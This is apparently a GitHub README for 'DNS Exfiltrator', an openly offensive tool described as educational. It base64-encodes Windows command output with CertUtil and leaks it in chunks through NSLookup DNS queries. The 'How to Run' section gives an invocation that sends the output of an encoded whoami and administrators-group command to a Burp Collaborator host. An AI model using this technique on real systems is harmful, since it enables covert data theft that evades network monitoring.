# DNS Exfiltrator

Exfiltrate data via DNS query. Based on CertUtil and NSLookup.

Command output will be encoded in Base64 encoding with CertUtil, and exfiltrated in chunks up to 63 characters per query with NSLookup.

Batch script for exfiltrating the command output was tested on Windows 10 Enterprise OS (64-bit).

Bash script for decoding the payload was tested on Kali Linux v2020.3 (64-bit).

Made for educational purposes. I hope it will help!

**TO DO: Make the whole Batch script as an one-liner.**

**TO DO: Finish the project.**

## How to Run

**TO DO: Make this section more clear.**

Open the Command Prompt from [\\src\\](https://github.com/ivan-sincek/dns-exfiltrator/tree/main/src) and run the following command:

```fundamental
dns_exfiltrator.bat d2hvYW1p xyz.burpcollaborator.net
```

Your command must be a Batch one-liner encoded in Base64 encoding, e.g. `d2hvYW1pICYmIG5ldCBsb2NhbGdyb3VwIGFkbWluaXN0cmF0b3Jz` - which is equal to `whoami && net localgroup administrators`.

**TO DO: Not all DNS queries are pulled from Burp Collaborator, and duplicates may occur. Have to find a solution, maybe make my own Burp Suite extension.**

## Images

<p align="center"><img src="https://github.com/ivan-sincek/dns-exfiltrator/blob/main/img/dns_exfiltration.jpg" alt="DNS Exfiltration"></p>

<p align="center">Figure 1 - DNS Exfiltration</p>

<p align="center"><img src="https://github.com/ivan-sincek/dns-exfiltrator/blob/main/img/wireshark_burp.jpg" alt="Wireshark & Burp Collaborator"></p>

<p align="center">Figure 2 - Wireshark & Burp Collaborator</p>

<p align="center"><img src="https://github.com/ivan-sincek/dns-exfiltrator/blob/main/img/save_wireshark_tcp_stream.jpg" alt="Wireshark TCP Stream"></p>

<p align="center">Figure 3 - Wireshark TCP Stream</p>
